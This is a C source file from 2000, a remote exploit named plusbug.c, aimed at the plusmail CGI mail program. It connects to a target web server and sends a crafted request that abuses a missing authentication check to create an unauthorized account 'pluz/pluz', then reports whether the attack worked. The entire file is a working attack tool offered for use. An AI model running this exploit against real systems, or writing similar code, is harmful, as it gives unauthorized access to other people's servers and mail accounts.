/*
 * [Synnergy Networks http://www.synnergy.net]
 * 
 * Title:	plusbug.c - [remote plusmail exploit]
 * Author:	headflux (hf@synnergy.net)
 * Date:	01.10.2000
 * Description:	plusmail fails to check authenticity before creating new
 *		accounts
 *
 * [Synnergy Networks (c) 2000, http://www.synnergy.net]
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

int main(int argc, char *argv[])
{
    char *expcgi = "GET /cgi-bin/plusmail?login=pluz&password=pluz&"
                   "password1=pluz&new_login=Login HTTP/1.0\n\n";

    struct hostent *hp;
    struct in_addr addr;
    struct sockaddr_in s;
    u_char buf[280];
    int p, i;
 
    if (argc < 1)
    {
        printf("usage: %s hostname\n", argv[0]);
        exit(1);
    } 

    hp = gethostbyname(argv[1]);
    if(!hp)
    {
        printf("bad hostname.\n");
        exit(1);
    }

    bcopy (hp->h_addr, &addr, sizeof (struct in_addr));
    p = socket (s.sin_family = 2, 1, IPPROTO_TCP);
    s.sin_port = htons(80);
    s.sin_addr.s_addr = inet_addr (inet_ntoa (addr));

    if(connect (p, &s, sizeof (s))!=0)
    {
        printf("error: unable to connect.\n");
  	return;
    }
    else
    {
        send(p, expcgi, strlen(expcgi), 0);
        alarm(5);
        read(p, buf, 255);
        close(p);
    }

    if (strstr(buf, "200 OK") && ! strstr(buf, "Invalid"))
        printf("account pluz/pluz created.\n");
    else
        printf("exploit failed.\n");

    return(0);
}
/*                    www.hack.co.za           [21 July]*/
